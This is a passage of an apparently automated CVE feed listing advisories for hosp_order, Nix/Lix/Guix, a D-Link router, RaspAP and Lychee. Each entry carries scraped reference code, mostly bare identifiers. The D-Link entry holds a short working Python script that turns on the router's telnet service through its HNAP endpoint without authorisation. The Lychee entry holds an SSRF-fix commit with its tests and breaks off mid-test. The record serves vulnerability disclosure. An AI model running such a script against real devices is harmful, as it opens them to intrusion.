Modified: 2025-06-30T18:38:23.493
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in sfturing hosp_order up to 627f426331da8086ce8fff2017d65b1ddef384f8. Affected is the function findAllHosByCondition of the file HospitalServiceImpl.java. The manipulation of the argument hospitalName leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available.

References (4):
  1. https://github.com/sfturing/hosp_order/issues/110
  2. https://vuldb.com/?ctiid.314082
  3. https://vuldb.com/?id.314082
  4. https://vuldb.com/?submit.601081

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314082 ---
findAllHosByCondition

findAllHosByCondition

hospitalName

================================================================================


CVE ID: CVE-2025-52993
Published: 2025-06-27T14:15:42.283
Modified: 2025-06-30T18:38:48.477
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L

CWE Categories:
  - CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')

Description:
A race condition in the Nix, Lix, and Guix package managers enables changing the ownership of arbitrary files to the UID and GID of the build user (e.g., nixbld* or guixbuild*). This affects Nix before 2.24.15, 2.26.4, 2.28.4, and 2.29.1; Lix before 2.91.2, 2.92.2, and 2.93.1; and Guix before 1.4.0-38.0e79d5b.

References (6):
  1. https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017
  2. https://guix.gnu.org/en/blog/2025/privilege-escalation-vulnerabilities-2025/
  3. https://labs.snyk.io
  4. https://lix.systems/blog/2025-06-24-lix-cves/
  5. https://security-tracker.debian.org/tracker/CVE-2025-52993
  6. https://security.snyk.io/vuln/?search=CVE-2025-52993

Attempting to extract code examples from references...

--- Code from https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017 ---
nixbld*

nixVersions.nix_2_3

lib/minver.nix

================================================================================


CVE ID: CVE-2025-52992
Published: 2025-06-27T14:15:41.990
Modified: 2025-06-30T18:38:48.477
CVSS Score: 3.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N

CWE Categories:
  - CWE-732: Incorrect Permission Assignment for Critical Resource

Description:
The Nix, Lix, and Guix package managers fail to properly set permissions when a derivation build fails. This may allow arbitrary processes to modify the content of a store outside of the build sandbox. This affects Nix before 2.24.15, 2.26.4, 2.28.4, and 2.29.1; Lix before 2.91.2, 2.92.2, and 2.93.1; and Guix before 1.4.0-38.0e79d5b.

References (6):
  1. https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017
  2. https://guix.gnu.org/en/blog/2025/privilege-escalation-vulnerabilities-2025/
  3. https://labs.snyk.io
  4. https://lix.systems/blog/2025-06-24-lix-cves/
  5. https://security-tracker.debian.org/tracker/CVE-2025-52992
  6. https://security.snyk.io/vuln/?search=CVE-2025-52992

Attempting to extract code examples from references...

--- Code from https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017 ---
nixbld*

nixVersions.nix_2_3

lib/minver.nix

================================================================================


CVE ID: CVE-2025-52991
Published: 2025-06-27T14:15:41.253
Modified: 2025-06-30T18:38:48.477
CVSS Score: 3.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N

CWE Categories:
  - CWE-276: Incorrect Default Permissions

Description:
The Nix, Lix, and Guix package managers default to using temporary build directories in a world-readable and world-writable location. This allows standard users to deceive the package manager into using directories with pre-existing content, potentially leading to unauthorized actions or data manipulation. This affects Nix before 2.24.15, 2.26.4, 2.28.4, and 2.29.1; Lix before 2.91.2, 2.92.2, and 2.93.1; and Guix before 1.4.0-38.0e79d5b.

References (6):
  1. https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017
  2. https://guix.gnu.org/en/blog/2025/privilege-escalation-vulnerabilities-2025/
  3. https://labs.snyk.io
  4. https://lix.systems/blog/2025-06-24-lix-cves/
  5. https://security-tracker.debian.org/tracker/CVE-2025-52991
  6. https://security.snyk.io/vuln/?search=CVE-2025-52991

Attempting to extract code examples from references...

--- Code from https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017 ---
nixbld*

nixVersions.nix_2_3

lib/minver.nix

================================================================================


CVE ID: CVE-2025-46416
Published: 2025-06-27T14:15:38.163
Modified: 2025-06-30T18:38:48.477
CVSS Score: 2.9 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-282: CWE-282

Description:
The Nix, Lix, and Guix package managers allow a bypass of build isolation in which a user can elevate their privileges to the build user account (e.g., nixbld or guixbuild). This affects Nix through 2.24.15, 2.26.4, 2.28.4, and 2.29.1; Lix through 2.91.2, 2.92.2, and 2.93.1; and Guix before 1.4.0-38.0e79d5b.

References (6):
  1. https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017
  2. https://guix.gnu.org/en/blog/2025/privilege-escalation-vulnerabilities-2025/
  3. https://labs.snyk.io
  4. https://lix.systems/blog/2025-06-24-lix-cves/
  5. https://security-tracker.debian.org/tracker/CVE-2025-46416
  6. https://security.snyk.io/vuln/?search=CVE-2025-46416

Attempting to extract code examples from references...

--- Code from https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017 ---
nixbld*

nixVersions.nix_2_3

lib/minver.nix

================================================================================


CVE ID: CVE-2025-46415
Published: 2025-06-27T14:15:37.870
Modified: 2025-06-30T18:38:48.477
CVSS Score: 3.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:N/I:N/A:L

CWE Categories:
  - CWE-367: CWE-367

Description:
A race condition in the Nix, Lix, and Guix package managers allows the removal of content from arbitrary folders. This affects Nix before 2.24.15, 2.26.4, 2.28.4, and 2.29.1; Lix before 2.91.2, 2.92.2, and 2.93.1; and Guix before 1.4.0-38.0e79d5b.

References (6):
  1. https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017
  2. https://guix.gnu.org/en/blog/2025/privilege-escalation-vulnerabilities-2025/
  3. https://labs.snyk.io
  4. https://lix.systems/blog/2025-06-24-lix-cves/
  5. https://security-tracker.debian.org/tracker/CVE-2025-46415
  6. https://security.snyk.io/vuln/?search=CVE-2025-46415

Attempting to extract code examples from references...

--- Code from https://discourse.nixos.org/t/security-advisory-privilege-escalations-in-nix-lix-and-guix/66017 ---
nixbld*

nixVersions.nix_2_3

lib/minver.nix

================================================================================


CVE ID: CVE-2025-45729
Published: 2025-06-27T14:15:37.630
Modified: 2025-07-01T18:16:07.600
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284

Description:
D-Link DIR-823-Pro 1.02 has improper permission control, allowing unauthorized users to turn on and access Telnet services.

References (1):
  1. https://www.kdev.site/2025/04/02/d-link-823_pro-unauthorized-telnet-access/ [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.kdev.site/2025/04/02/d-link-823_pro-unauthorized-telnet-access/ ---
<code class="language-python line-numbers">import requests
burp0_url = "http://192.168.0.1:80/HNAP1/"
burp0_headers = {"Accept": "application/json", "SOAPACTION": "\"http://purenetworks.com/HNAP1/SetTelnetSettings\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36", "Content-Type": "application/json", "Origin": "http://192.168.0.1", "Referer": "http://192.168.0.1/priv_mgt.html", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_json={"SetTelnetSettings": {"telnet_enabled": "1"}}
requests.post(burp0_url, headers=burp0_headers, json=burp0_json)


================================================================================


CVE ID: CVE-2025-44163
Published: 2025-06-27T14:15:37.417
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-23: CWE-23

Description:
RaspAP raspap-webgui 3.3.1 is vulnerable to Directory Traversal in ajax/networking/get_wgkey.php. An authenticated attacker can send a crafted POST request with a path traversal payload in the `entity` parameter to overwrite arbitrary files writable by the web server via abuse of the `tee` command used in shell execution.

References (2):
  1. https://gist.github.com/YichaoXu/3694f039a3d1b973efd068e4dc662a41
  2. https://github.com/RaspAP/raspap-webgui/blob/125ae7a39ad7c9a71250d3b3e349fd767687ff8d/ajax/networking/get_wgkey.php#L9

Attempting to extract code examples from references...

--- Code from https://gist.github.com/YichaoXu/3694f039a3d1b973efd068e4dc662a41 ---
entity

get_wgkey.php

/ajax/networking/get_wgkey.php

================================================================================


CVE ID: CVE-2025-6767
Published: 2025-06-27T13:15:25.367
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in sfturing hosp_order up to 627f426331da8086ce8fff2017d65b1ddef384f8. It has been rated as critical. This issue affects the function findDoctorByCondition of the file DoctorServiceImpl.java. The manipulation of the argument hospitalName leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. This product takes the approach of rolling releases to provide continious delivery. Therefore, version details for affected and updated releases are not available.

References (4):
  1. https://github.com/sfturing/hosp_order/issues/109
  2. https://vuldb.com/?ctiid.314081
  3. https://vuldb.com/?id.314081
  4. https://vuldb.com/?submit.600547

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314081 ---
findDoctorByCondition

findDoctorByCondition

hospitalName

================================================================================


CVE ID: CVE-2025-6766
Published: 2025-06-27T13:15:25.153
Modified: 2025-07-08T14:48:43.857
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in sfturing hosp_order up to 627f426331da8086ce8fff2017d65b1ddef384f8. It has been declared as critical. This vulnerability affects the function getOfficeName of the file OfficeServiceImpl.java. The manipulation of the argument officesName leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. This product is using a rolling release to provide continious delivery. Therefore, no version details for affected nor updated releases are available.

References (5):
  1. https://github.com/sfturing/hosp_order/issues/108 [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.314080 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314080 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.600529 [Third Party Advisory, VDB Entry]
  5. https://github.com/sfturing/hosp_order/issues/108 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314080 ---
getOfficeName

getOfficeName

officesName

================================================================================


CVE ID: CVE-2025-53018
Published: 2025-06-27T13:15:24.803
Modified: 2025-06-30T18:38:48.477
CVSS Score: 3.0 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-918: Server-Side Request Forgery (SSRF)

Description:
Lychee is a free, open-source photo-management tool. Prior to version 6.6.13, a critical Server-Side Request Forgery (SSRF) vulnerability exists in the `/api/v2/Photo::fromUrl` endpoint. This flaw lets an attacker instruct the application’s backend to make HTTP requests to any URL they choose. Consequently, internal network resources—such as localhost services or cloud-provider metadata endpoints—become reachable. The endpoint takes a URL from the user and calls it server-side via fopen() without any safeguards. There is no IP address validation, nor are there any allow-list, timeout, or size restrictions. Because of this, attackers can point the application at internal targets. Using this flaw, an attacker can perform internal port scans or retrieve sensitive cloud metadata. Version 6.6.13 contains a patch for the issue.

References (3):
  1. https://github.com/LycheeOrg/Lychee/commit/9dc162eefe56ce185ac1d59da42ee557933d914d
  2. https://github.com/LycheeOrg/Lychee/security/advisories/GHSA-cpgw-wgf3-xc6v
  3. https://github.com/LycheeOrg/Lychee/security/advisories/GHSA-cpgw-wgf3-xc6v

Attempting to extract code examples from references...

--- Code from https://github.com/LycheeOrg/Lychee/commit/9dc162eefe56ce185ac1d59da42ee557933d914d ---
From 9dc162eefe56ce185ac1d59da42ee557933d914d Mon Sep 17 00:00:00 2001
From: =?UTF-8?q?Beno=C3=AEt=20Viguier?= <ildyria@users.noreply.github.com>
Date: Fri, 27 Jun 2025 10:17:50 +0200
Subject: [PATCH] fix: mitigate SSRF + bump version (#3498)

---
 app/Actions/Import/FromUrl.php                |   5 +
 app/Assets/ArrayToTextTable.php               |   8 +
 app/Assets/Helpers.php                        |   2 +
 app/Http/Requests/Photo/FromUrlRequest.php    |   3 +-
 app/Providers/AppServiceProvider.php          |   3 +-
 app/Rules/PhotoUrlRule.php                    | 100 +++++++++
 .../2025_06_26_102340_parse_url_options.php   |  67 ++++++
 .../2025_06_26_115949_bump_version060613.php  |  46 ++++
 tests/Feature_v2/Photo/PhotoFromUrlTest.php   |   4 +-
 tests/Unit/Rules/PhotoUrlRuleTest.php         | 198 ++++++++++++++++++
 version.md                                    |   2 +-
 11 files changed, 433 insertions(+), 5 deletions(-)
 create mode 100644 app/Rules/PhotoUrlRule.php
 create mode 100644 database/migrations/2025_06_26_102340_parse_url_options.php
 create mode 100644 database/migrations/2025_06_26_115949_bump_version060613.php
 create mode 100644 tests/Unit/Rules/PhotoUrlRuleTest.php

diff --git a/app/Actions/Import/FromUrl.php b/app/Actions/Import/FromUrl.php
index 7a10d839323..a02b32b034c 100644
--- a/app/Actions/Import/FromUrl.php
+++ b/app/Actions/Import/FromUrl.php
@@ -71,14 +71,19 @@ public function do(array $urls, ?Album $album, int $intended_owner_id): Collecti
 
 				// Import photo/video/raw
 				$result->add($create->add($downloaded_file, $album));
+				// @codeCoverageIgnoreStart
 			} catch (\Throwable $e) {
 				$exceptions[] = $e;
 				Handler::reportSafely($e);
 			}
+			// @codeCoverageIgnoreEnd
 		}
 
 		if (count($exceptions) !== 0) {
+			// @codeCoverageIgnoreStart
+			// Those are already caught.
 			throw new MassImportException($exceptions);
+			// @codeCoverageIgnoreEnd
 		}
 
 		return $result;
diff --git a/app/Assets/ArrayToTextTable.php b/app/Assets/ArrayToTextTable.php
index 53c0c40a788..53f1d27d326 100644
--- a/app/Assets/ArrayToTextTable.php
+++ b/app/Assets/ArrayToTextTable.php
@@ -87,7 +87,9 @@ public function __toString(): string
 	public function getTable(?array $rawData = null): string
 	{
 		if (!is_null($rawData)) {
+			// @codeCoverageIgnoreStart
 			$this->setData($rawData);
+			// @codeCoverageIgnoreEnd
 		}
 
 		$data = $this->prepare();
@@ -108,6 +110,7 @@ public function getTable(?array $rawData = null): string
 		$table = $i . $this->line($d->getTopLeft(), $d->getHorizontal(), $d->getHorizontalDown(), $d->getTopRight()) . PHP_EOL;
 
 		if ($displayKeys === true || $displayKeys === 'auto') {
+			// @codeCoverageIgnoreStart
 			$keysRow = array_combine($this->keys, $this->keys);
 			if ($this->upperKeys) {
 				$keysRow = array_map('mb_strtoupper', $keysRow);
@@ -115,6 +118,7 @@ public function getTable(?array $rawData = null): string
 			$table .= $i . implode(PHP_EOL, $this->row($keysRow, $this->keysAlignment)) . PHP_EOL;
 
 			$table .= $i . $this->line($d->getVerticalRight(), $d->getHorizontal(), $d->getCross(), $d->getVerticalLeft()) . PHP_EOL;
+			// @codeCoverageIgnoreEnd
 		}
 
 		foreach ($data as $row) {
@@ -141,9 +145,11 @@ public function setData(array|null $data): self
 		foreach ($data as $row) {
 			if (is_array($row)) {
 				$arrayData[] = $row;
+			// @codeCoverageIgnoreStart
 			} elseif (is_object($row)) {
 				$arrayData[] = get_object_vars($row);
 			}
+			// @codeCoverageIgnoreEnd
 		}
 
 		$this->data = $arrayData;
@@ -278,7 +284,9 @@ protected function rowLine(array $row, int $alignment): string
 		}
 
 		if (count($row) === 0) {
+			// @codeCoverageIgnoreStart
 			$line .= $this->decorator->getVertical();
+			// @codeCoverageIgnoreEnd
 		}
 
 		return $line;
diff --git a/app/Assets/Helpers.php b/app/Assets/Helpers.php
index 42a31f0c9a8..2346d349cbc 100644
--- a/app/Assets/Helpers.php
+++ b/app/Assets/Helpers.php
@@ -115,9 +115,11 @@ public function isExecAvailable(): bool
 			$disabled_functions = explode(',', ini_get('disable_functions'));
 
 			return function_exists('exec') && !in_array('exec', $disabled_functions, true);
+			// @codeCoverageIgnoreStart
 		} catch (InfoException $e) {
 			return false;
 		}
+		// @codeCoverageIgnoreEnd
 	}
 
 	/**
diff --git a/app/Http/Requests/Photo/FromUrlRequest.php b/app/Http/Requests/Photo/FromUrlRequest.php
index 4e309872354..ca820cd789a 100644
--- a/app/Http/Requests/Photo/FromUrlRequest.php
+++ b/app/Http/Requests/Photo/FromUrlRequest.php
@@ -16,6 +16,7 @@
 use App\Http\Requests\Traits\HasAlbumTrait;
 use App\Models\Album;
 use App\Policies\AlbumPolicy;
+use App\Rules\PhotoUrlRule;
 use App\Rules\RandomIDRule;
 use Illuminate\Support\Facades\Gate;
 
@@ -43,7 +44,7 @@ public function rules(): array
 		return [
 			RequestAttribute::ALBUM_ID_ATTRIBUTE => ['present', new RandomIDRule(true)],
 			RequestAttribute::URLS_ATTRIBUTE => 'required|array|min:1',
-			RequestAttribute::URLS_ATTRIBUTE . '.*' => 'required|string',
+			RequestAttribute::URLS_ATTRIBUTE . '.*' => ['required', 'string', new PhotoUrlRule()],
 		];
 	}
 
diff --git a/app/Providers/AppServiceProvider.php b/app/Providers/AppServiceProvider.php
index 30edb95ec7d..e6ccc384042 100644
--- a/app/Providers/AppServiceProvider.php
+++ b/app/Providers/AppServiceProvider.php
@@ -216,7 +216,7 @@ private function logSQL(QueryExecuted $query): void
 
 			return;
 		}
-
+		// @codeCoverageIgnoreStart
 		// For mysql we perform an explain as this is usually the one being slower...
 		$bindings = collect($query->bindings)->map(function ($q) {
 			return match (gettype($q)) {
@@ -238,5 +238,6 @@ private function logSQL(QueryExecuted $query): void
 		$msg .= $sql_with_bindings . PHP_EOL;
 		$msg .= $renderer->getTable($explain);
 		Log::debug($msg);
+		// @codeCoverageIgnoreEnd
 	}
 }
diff --git a/app/Rules/PhotoUrlRule.php b/app/Rules/PhotoUrlRule.php
new file mode 100644
index 00000000000..a468c488a6b
--- /dev/null
+++ b/app/Rules/PhotoUrlRule.php
@@ -0,0 +1,100 @@
+<?php
+
+/**
+ * SPDX-License-Identifier: MIT
+ * Copyright (c) 2017-2018 Tobias Reich
+ * Copyright (c) 2018-2025 LycheeOrg.
+ */
+
+namespace App\Rules;
+
+use App\Models\Configs;
+use Illuminate\Contracts\Validation\ValidationRule;
+use Safe\Exceptions\UrlException;
+use function Safe\parse_url;
+
+final class PhotoUrlRule implements ValidationRule
+{
+	/**
+	 * {@inheritDoc}
+	 */
+	public function validate(string $attribute, mixed $value, \Closure $fail): void
+	{
+		// Validate we are dealing with a string.
+		if (is_string($value) === false) {
+			$fail($attribute . ' is not a string');
+
+			return;
+		}
+
+		// Validate we are dealing with a valid URL.
+		// Note: This does not check whether the URL is reachable, only that it is syntactically correct.
+		if (!filter_var($value, FILTER_VALIDATE_URL)) {
+			$fail($attribute . ' is not a valid URL');
+
+			return;
+		}
+
+		try {
+			// Get the URL components.
+			/** @var array{scheme:string|null,host:string,port:string|int|null} $url */
+			$url = parse_url($value);
+			// @codeCoverageIgnoreStart
+			// This is already filtered by the previous filter_var check, but we catch it here
+			// to ensure we handle any unexpected exceptions gracefully.
+		} catch (UrlException) {
+			$fail($attribute . ' is not a valid URL');
+
+			return;
+		}
+		// @codeCoverageIgnoreEnd
+
+		$scheme = $url['scheme'] ?? '';
+		$host = $url['host'] ?? '';
+		$port = $url['port'] ?? null;
+
+		if (
+			Configs::getValueAsBool('import_via_url_require_https') &&
+			$scheme !== 'https'
+		) {
+			$fail($attribute . ' must be a valid HTTPS URL.');
+
+			return;
+		}
+
+		if (!in_array($scheme, ['https', 'http', ''], true)) {
+			$fail($attribute . ' must be a valid HTTP or HTTPS URL.');
+
+			return;
+		}
+
+		if (
+			Configs::getValueAsBool('import_via_url_forbidden_ports') &&
+			$port !== null &&
+			!in_array($port, [80, 443], true)
+		) {
+			$fail($attribute . ' must use a valid port such as 80 or 443.');
+
+			return;
+		}
+
+		if (
+			Configs::getValueAsBool('import_via_url_forbidden_local_ip') &&
+			filter_var($host, FILTER_VALIDATE_IP) !== false &&
+			filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false
+		) {
+			$fail($attribute . ' must not be a private IP address.');
+
+			return;
+		}
+
+		if (
+			Configs::getValueAsBool('import_via_url_forbidden_localhost') &&
+			$host === 'localhost'
+		) {
+			$fail($attribute . ' must not be localhost.');
+
+			return;
+		}
+	}
+}
diff --git a/database/migrations/2025_06_26_102340_parse_url_options.php b/database/migrations/2025_06_26_102340_parse_url_options.php
new file mode 100644
index 00000000000..0ca5ba4784c
--- /dev/null
+++ b/database/migrations/2025_06_26_102340_parse_url_options.php
@@ -0,0 +1,67 @@
+<?php
+
+/**
+ * SPDX-License-Identifier: MIT
+ * Copyright (c) 2017-2018 Tobias Reich
+ * Copyright (c) 2018-2025 LycheeOrg.
+ */
+
+use App\Models\Extensions\BaseConfigMigration;
+
+return new class() extends BaseConfigMigration {
+	public const CONFIG = 'Admin';
+
+	public function getConfigs(): array
+	{
+		return [
+			[
+				'key' => 'import_via_url_forbidden_localhost',
+				'value' => '1',
+				'cat' => self::CONFIG,
+				'type_range' => self::BOOL,
+				'description' => 'Import via URL must not use localhost',
+				'details' => '<span class="pi pi-exclamation-triangle text-orange-500"></span> Disabling this expose your localhost to the Import via URL functionality and lead to Server-Side Request Forgery (SSRF).',
+				'is_secret' => false,
+				'is_expert' => true,
+				'level' => 0,
+				'order' => 20,
+			],
+			[
+				'key' => 'import_via_url_forbidden_local_ip',
+				'value' => '1',
+				'cat' => self::CONFIG,
+				'type_range' => self::BOOL,
+				'description' => 'Import via URL must not use local IPs',
+				'details' => '<span class="pi pi-exclamation-triangle text-orange-500"></span> Disabling this expose your internal network to the Import via URL functionality and lead to Server-Side Request Forgery (SSRF).',
+				'is_secret' => false,
+				'is_expert' => true,
+				'level' => 0,
+				'order' => 21,
+			],
+			[
+				'key' => 'import_via_url_require_https',
+				'value' => '1',
+				'cat' => self::CONFIG,
+				'type_range' => self::BOOL,
+				'description' => 'Import via URL must use https',
+				'details' => '<span class="pi pi-exclamation-triangle text-orange-500"></span> Disabling this will lower the security of the Import via URL functionality.',
+				'is_secret' => false,
+				'is_expert' => true,
+				'level' => 0,
+				'order' => 22,
+			],
+			[
+				'key' => 'import_via_url_forbidden_ports',
+				'value' => '1',
+				'cat' => self::CONFIG,
+				'type_range' => self::BOOL,
+				'description' => 'Import via URL must use port 80 or 443',
+				'details' => '<span class="pi pi-exclamation-triangle text-orange-500"></span> Disabling this will allow the Import via URL to use any ports which may lead to Server-Side Request Forgery (SSRF).',
+				'is_secret' => false,
+				'is_expert' => true,
+				'level' => 0,
+				'order' => 23,
+			],
+		];
+	}
+};
\ No newline at end of file
diff --git a/database/migrations/2025_06_26_115949_bump_version060613.php b/database/migrations/2025_06_26_115949_bump_version060613.php
new file mode 100644
index 00000000000..83a39f9308f
--- /dev/null
+++ b/database/migrations/2025_06_26_115949_bump_version060613.php
@@ -0,0 +1,46 @@
+<?php
+
+/**
+ * SPDX-License-Identifier: MIT
+ * Copyright (c) 2017-2018 Tobias Reich
+ * Copyright (c) 2018-2025 LycheeOrg.
+ */
+
+use Illuminate\Database\Migrations\Migration;
+use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
+use Symfony\Component\Console\Output\ConsoleOutput;
+use Symfony\Component\Console\Output\ConsoleSectionOutput;
+
+return new class() extends Migration {
+	private ConsoleOutput $output;
+	private ConsoleSectionOutput $msg_section;
+
+	public function __construct()
+	{
+		$this->output = new ConsoleOutput();
+		$this->msg_section = $this->output->section();
+	}
+
+	/**
+	 * Run the migrations.
+	 *
+	 * @return void
+	 */
+	public function up(): void
+	{
+		DB::table('configs')->where('key', 'version')->update(['value' => '060613']);
+		Artisan::call('cache:clear');
+		$this->msg_section->writeln('<info>Info:</info> Cleared cache for version 6.6.13');
+	}
+
+	/**
+	 * Reverse the migrations.
+	 *
+	 * @return void
+	 */
+	public function down(): void
+	{
+		DB::table('configs')->where('key', 'version')->update(['value' => '060612']);
+	}
+};
diff --git a/tests/Feature_v2/Photo/PhotoFromUrlTest.php b/tests/Feature_v2/Photo/PhotoFromUrlTest.php
index 2b57ca8fda4..c62f56c5884 100644
--- a/tests/Feature_v2/Photo/PhotoFromUrlTest.php
+++ b/tests/Feature_v2/Photo/PhotoFromUrlTest.php
@@ -36,13 +36,13 @@ public function testAddPhotoUnauthorizedForbidden(): void
 
 		$response = $this->postJson(uri: 'Photo::fromUrl', data: [
 			'album_id' => $this->album1->id,
-			'urls' => ['example.com'],
+			'urls' => ['https://example.com'],
 		]);
 		$this->assertUnauthorized($response);
 
 		$response = $this->actingAs($this->userNoUpload)->postJson('Photo::fromUrl', data: [
 			'album_id' => $this->album1->id,
-			'urls' => ['example.com'],
+			'urls' => ['https://example.com'],
 		]);
 		$this->assertForbidden($response);
 	}
diff --git a/tests/Unit/Rules/PhotoUrlRuleTest.php b/tests/Unit/Rules/PhotoUrlRuleTest.php
new file mode 100644
index 00000000000..613e1924165
--- /dev/null
+++ b/tests/Unit/Rules/PhotoUrlRuleTest.php
@@ -0,0 +1,198 @@
+<?php
+
+/**
+ * SPDX-License-Identifier: MIT
+ * Copyright (c) 2017-2018 Tobias Reich
+ * Copyright (c) 2018-2025 LycheeOrg.
+ */
+
+/**
+ * We don't care for unhandled exceptions in tests.
+ * It is the nature of a test to throw an exception.
+ * Without this suppression we had 100+ Linter warning in this file which
+ * don't help anything.
+ *
+ * @noinspection PhpDocMissingThrowsInspection
+ * @noinspection PhpUnhandledExceptionInspection
+ */
+
+namespace Tests\Unit\Rules;
+
+use App\Models\Configs;
+use App\Rules\PhotoUrlRule;
+use Tests\AbstractTestCase;
+
+class PhotoUrlRuleTest extends AbstractTestCase
+{
+	private PhotoUrlRule $rule;
+	private $failCalled = false;
+	private $failMessage = '';
+
+	public function setUp(): void
+	{
+		parent::setUp();
+		$this->rule = new PhotoUrlRule();
+		$this->failCalled = false;
+		$this->failMessage = '';
+
+		Configs::set('import_via_url_require_https', '1');
+		Configs::set('import_via_url_forbidden_ports', '1');
+		Configs::set('import_via_url_forbidden_local_ip', '1');
+		Configs::set('import_via_url_forbidden_localhost', '1');
+		Configs::invalidateCache();
+	}
+
+	public function tearDown(): void
+	{
+		Configs::set('import_via_url_require_https', '1');
+		Configs::set('import_via_url_forbidden_ports', '1');
+		Configs::set('import_via_url_forbidden_local_ip', '1');
+		Configs::set('import_via_url_forbidden_localhost', '1');
+		Configs::invalidateCache();
+
+		parent::tearDown();
+	}
+
+	public function m(string $message)
+	{
+		$this->failCalled = true;
+		$this->failMessage = $message;
+	}
+
+	/**
+	 * Test validation with a non-string value.
+	 */
+	public function testNonStringValue(): void
+	{
+		$this->rule->validate('photo_url', 123, fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url is not a string', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with an invalid URL format.
+	 */
+	public function testInvalidUrlFormat(): void
+	{
+		$this->rule->validate('photo_url', 'not-a-url', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url is not a valid URL', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with malformed URL that causes parse_url to throw an exception.
+	 */
+	public function testUrlParsingException(): void
+	{
+		$this->rule->validate('photo_url', 'http://example.com:port', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url is not a valid URL', $this->failMessage);
+	}
+
+	/**
+	 * Test validation when HTTPS is required but not provided.
+	 */
+	public function testHttpsRequiredButNotProvided(): void
+	{
+		$this->rule->validate('photo_url', 'http://example.com', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url must be a valid HTTPS URL.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with allowed HTTPS scheme when required.
+	 */
+	public function testHttpsRequiredAndProvided(): void
+	{
+		$this->rule->validate('photo_url', 'https://example.com', fn ($m) => $this->m($m));
+		self::assertFalse($this->failCalled);
+		self::assertEquals('', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with unsupported URL scheme.
+	 */
+	public function testUnsupportedScheme(): void
+	{
+		Configs::set('import_via_url_require_https', '0');
+		Configs::invalidateCache();
+		$this->rule->validate('photo_url', 'ftp://example.com', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
